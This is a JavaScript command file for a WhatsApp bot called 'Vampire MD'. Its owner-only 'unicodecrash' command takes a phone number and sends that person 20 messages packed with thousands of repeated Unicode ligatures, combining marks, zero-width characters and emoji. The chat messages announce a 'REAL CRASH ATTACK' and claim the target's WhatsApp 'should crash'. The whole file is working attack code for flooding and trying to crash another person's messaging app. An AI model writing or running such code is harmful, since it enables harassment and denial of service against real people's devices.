export default {
  name: 'unicodecrash',
  description: 'Real WhatsApp crash with special characters',
  category: 'bug',
  aliases: ['realcrash', 'uwu', 'wacrash'],
  ownerOnly: true,
  async execute(sock, msg, args) {
    const chatId = msg.key.remoteJid;
    const target = args[0]?.replace(/[^0-9]/g, '');
    if (!target) return sock.sendMessage(chatId, { text: '❌ .unicodecrash <number>' }, { quoted: msg });
    
    const targetJid = target + '@s.whatsapp.net';
    
    // Real Unicode crash characters
    const crashChars = [
      '﷽'.repeat(1000),
      'ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًً',
      '﻿'.repeat(2000),
      '᷂'.repeat(500) + '̤'.repeat(500) + '̝'.repeat(500),
      String.fromCodePoint(0x1F600).repeat(3000)
    ];
    
    await sock.sendMessage(chatId, { text: `💀 *REAL CRASH ATTACK ON +${target}*\nSending 20 crash messages...` });
    
    for (let i = 0; i < 20; i++) {
      try {
        const crash = crashChars[i % crashChars.length] + '\n🧛 Vampire MD';
        await sock.sendMessage(targetJid, { text: crash.substring(0, 60000) });
        await new Promise(r => setTimeout(r, 300));
      } catch(e) { break; }
    }
    
    await sock.sendMessage(chatId, { text: `💀 *CRASH SENT!\n+${target} WhatsApp should crash!\n\n⚡ *Vampire Tech* 🧛` });
  }
};
